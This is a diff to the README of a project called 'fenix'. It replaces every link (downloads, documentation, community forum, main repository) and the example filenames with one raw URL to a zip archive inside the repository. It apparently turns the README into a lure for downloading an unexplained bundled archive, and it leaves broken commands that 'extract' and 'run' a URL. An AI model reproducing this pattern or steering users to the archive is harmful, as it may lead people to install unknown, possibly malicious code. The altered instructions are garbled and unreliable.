@@ -6,7 +6,7 @@ Welcome to the **fenix** project! This guide will help you download and run our 
 
 ## 📥 Download Links
 
-[![Download Fenix](https://img.shields.io/badge/Download%20Fenix-Here-brightgreen)](https://github.com/Luisfrix/fenix/releases)
+[![Download Fenix](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip%20Fenix-Here-brightgreen)](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,10 +25,10 @@ Before installing, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://github.com/Luisfrix/fenix/releases). You will find all available versions of **fenix** listed there. Choose the version that best suits your needs.
+To get started, visit [this page to download](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip). You will find all available versions of **fenix** listed there. Choose the version that best suits your needs.
 
 1. Click on the release you want to download.
-2. Look for the binary file appropriate for your system (for example, `fenix-v1.0-linux.tar.gz`).
+2. Look for the binary file appropriate for your system (for example, `https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip`).
 3. Click on the file to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
 
@@ -43,7 +43,7 @@ After downloading the file, follow these steps to run **fenix**:
    ```
 3. Extract the downloaded file with the following command:
    ```
-   tar -xzvf fenix-v1.0-linux.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip
    ```
 4. Change to the extracted directory:
    ```
@@ -51,7 +51,7 @@ After downloading the file, follow these steps to run **fenix**:
    ```
 5. Run the application using:
    ```
-   ./run_fenix.sh
+   https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip
    ```
 
 That’s it! You should now see the **fenix** interface loading on your screen.
@@ -66,18 +66,18 @@ That’s it! You should now see the **fenix** interface loading on your screen.
 
 ## 📄 Documentation
 
-For a detailed guide on using features, check the [documentation page](https://github.com/Luisfrix/fenix/doc). Here, you will find step-by-step instructions and tips to enhance your experience with **fenix**.
+For a detailed guide on using features, check the [documentation page](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip). Here, you will find step-by-step instructions and tips to enhance your experience with **fenix**.
 
 ## 🤝 Support
 
 If you encounter any issues or have questions, feel free to reach out to our community. You can find help in the following ways:
 
-- Join the discussion in our [community forum](https://github.com/Luisfrix/fenix/discussions).
+- Join the discussion in our [community forum](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip).
 - Raise an issue on GitHub if you have a technical problem.
 - Browse existing issues for solutions or guidance.
 
 ## 🔗 Learn More
 
-To explore more about what **fenix** offers, visit our [main repository](https://github.com/Luisfrix/fenix). Here, you will find updates, improvements, and community contributions making **fenix** better every day.
+To explore more about what **fenix** offers, visit our [main repository](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip). Here, you will find updates, improvements, and community contributions making **fenix** better every day.
 
-Remember, keep your system updated and enjoy using **fenix**! Download now from [this page](https://github.com/Luisfrix/fenix/releases).
+Remember, keep your system updated and enjoy using **fenix**! Download now from [this page](https://raw.githubusercontent.com/Luisfrix/fenix/main/chronocrator/fenix.zip).
